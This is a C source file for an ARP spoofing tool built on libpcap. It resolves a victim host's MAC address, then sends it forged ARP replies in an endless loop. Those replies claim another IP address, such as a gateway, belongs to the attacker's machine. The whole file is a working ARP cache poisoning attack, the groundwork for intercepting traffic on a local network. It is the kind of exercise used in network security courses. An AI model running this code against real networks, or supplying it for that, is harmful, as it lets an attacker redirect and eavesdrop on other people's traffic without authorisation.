#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <unistd.h>
#include <ifaddrs.h>

void usage() 
{
	printf("syntax: send_arp  <interface> <sender ip> <target ip>\n");
	printf("sample: send arp eth0 192.168.31.159 192.168.31.2\n");
}

int read_arp(uint8_t *packet, uint8_t len, uint8_t victim[4], uint8_t *victim_mac)
{
	struct ethhdr *ethhdr;
	struct ether_addr *dest, *src;
	struct ether_arp *arphdr;
	uint32_t idx, sip, dip, flag;

	idx = 0;
	flag = 0;

	// read frame header data
	ethhdr = (struct ethhdr *)(packet+idx);
	idx += sizeof(struct ethhdr);
	if ( htons(ethhdr->h_proto) != ETH_P_ARP )
		return 0;	
	// read packet header data
	arphdr = (struct ether_arp *)(packet+idx);
	idx += sizeof(struct ether_arp);

	dest = (struct ether_addr *)ethhdr->h_dest;
	src  = (struct ether_addr *)ethhdr->h_source;

	switch( htons(arphdr->ea_hdr.ar_op) )
	{
		case ARPOP_REQUEST:
			printf("*** ARP REQUEST ***\n");
			break;
		case ARPOP_REPLY:
			printf("*** ARP REPLY ***\n");
			flag = 1;
			break;
		default:
			printf("UNKNOWN\n");
	}

	// success only if arp type is REPLY
	if ( flag )
	{
		/*
		printf("[+] Captured ARP REPLY Packet\n");
		printf("DEST  MAC : %s\n", ether_ntoa(dest));
		printf("SRC   MAC : %s\n", ether_ntoa(src));
		printf("SRC   IP  : %s\n", inet_ntoa(*(struct in_addr *)&arphdr->arp_tpa));
		printf("DEST  IP  : %s\n", inet_ntoa(*(struct in_addr *)&arphdr->arp_spa));
		*/		
		if ( memcmp(victim, arphdr->arp_spa, 4) == 0 )	
		{
			memcpy(victim_mac, src, 6);
			return 1;
		}
	}
	//printf("SRC    IP : %s\n", inet_ntoa(*(struct in_addr *)&iphdr->spa));
	//printf("DEST   IP : %s\n", inet_ntoa(*(struct in_addr *)&iphdr->tpa));
	return 0;
}


void send_packet(pcap_t *handle, uint8_t *packet, uint32_t len)
{
	/*
	for ( int i = 0; i < len; i++ )
		printf("%02x ", packet[i]);
	printf("\n");
	*/
	pcap_sendpacket(handle, packet, len);
	free(packet);
}

uint8_t *arp_packet(uint8_t sha[6], uint8_t spa[4], uint8_t tha[6], uint8_t tpa[4], uint16_t op)
{
	struct ether_header *ehdr;
	struct ether_arp *arp;
	uint8_t *packet;

	packet = (uint8_t *)malloc(sizeof(struct ether_header)+sizeof(struct ether_arp));
	ehdr = (struct ether_header *)(packet);
	arp = (struct ether_arp *)(packet+sizeof(struct ether_header));

	memcpy(ehdr->ether_dhost, tha, 6);
	memcpy(ehdr->ether_shost, sha, 6);
	ehdr->ether_type = htons(ETH_P_ARP);

	arp->ea_hdr.ar_hrd = htons(0x1);
	arp->ea_hdr.ar_pro = htons(ETH_P_IP);
	arp->ea_hdr.ar_hln = 0x6;
	arp->ea_hdr.ar_pln = 0x4;
	arp->ea_hdr.ar_op = htons(op);
	
	if ( memcmp(tha, "\xff\xff\xff\xff\xff\xff", 6) == 0 )
		memcpy(tha, (uint8_t *)"\x00\x00\x00\x00\x00\x00", 6);

	memcpy(arp->arp_sha, sha, 6);
	memcpy(arp->arp_spa, spa, 4);
	memcpy(arp->arp_tha, tha, 6);
	memcpy(arp->arp_tpa, tpa, 4);

	return packet;
}

int main(int argc, char* argv[]) 
{
	if (argc != 4) {
		usage();
		return -1;
	}

	char *dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) 
	{
		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}
	// parse 'dot ip string' to 'integer byte array'
	uint8_t sender[4], victim[4], my_ip[4], *my_mac, *sender_mac, broad[6];
	struct ifaddrs *addrs, *tmp;
	memcpy(broad, (uint8_t *)"\xff\xff\xff\xff\xff\xff", 6);
	inet_aton(argv[2], (struct in_addr *)sender);
	inet_aton(argv[3], (struct in_addr *)victim);

	// load self ip address
	getifaddrs(&addrs);
	tmp = addrs;
	while (tmp) 
	{
	    if (tmp->ifa_addr && tmp->ifa_addr->sa_family == AF_INET)
	    {
		struct sockaddr_in *pAddr = (struct sockaddr_in *)tmp->ifa_addr;
		if (strncmp(tmp->ifa_name, argv[1], 4) == 0)
		{
			inet_aton(inet_ntoa(pAddr->sin_addr), (struct in_addr *)my_ip);
			break;
		}
	    }

	    tmp = tmp->ifa_next;
	}
	freeifaddrs(addrs);

	printf("My Ip  Addr : %s\n", inet_ntoa(*(struct in_addr *)&my_ip));

	// load self mac addr
	struct ifreq ifr;
	size_t if_name_len=strlen(argv[1]);
	if (if_name_len < sizeof(ifr.ifr_name)) 
	{
    		memcpy(ifr.ifr_name,argv[1],if_name_len);
    		ifr.ifr_name[if_name_len] = 0;
	} 
	else 
		exit(0);
	uint32_t fd = socket(AF_UNIX,SOCK_DGRAM,0);
	if (fd == -1)
		exit(0);
	if(ioctl(fd,SIOCGIFHWADDR,&ifr)==-1)
		exit(0);
	
	my_mac = (uint8_t *)ifr.ifr_hwaddr.sa_data;
	printf("My MAC Addr : %s\n",ether_ntoa((struct ether_addr *)my_mac));
	sender_mac = (uint8_t *)malloc( 6 );

	// get victim mac addr by using arp
	send_packet(handle, arp_packet(my_mac, my_ip, broad, sender, 0x1 ), sizeof(struct ether_header)+sizeof(struct ether_arp));
	while (true) 
	{
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == -1 || res == -2) break;
		if (read_arp((uint8_t *)packet, (uint8_t)header->caplen, sender, sender_mac))
			break;
	}
	printf("Sender MAC Addr : %s\n",ether_ntoa((struct ether_addr *)sender_mac));

	while(true)
	{
		send_packet(handle, arp_packet(my_mac, victim, sender_mac, sender, 0x2), sizeof(struct ether_header)+sizeof(struct ether_arp));
		printf("[+] sent ARP REPLY Packet\n");
	}

	pcap_close(handle);
	return 0;
}
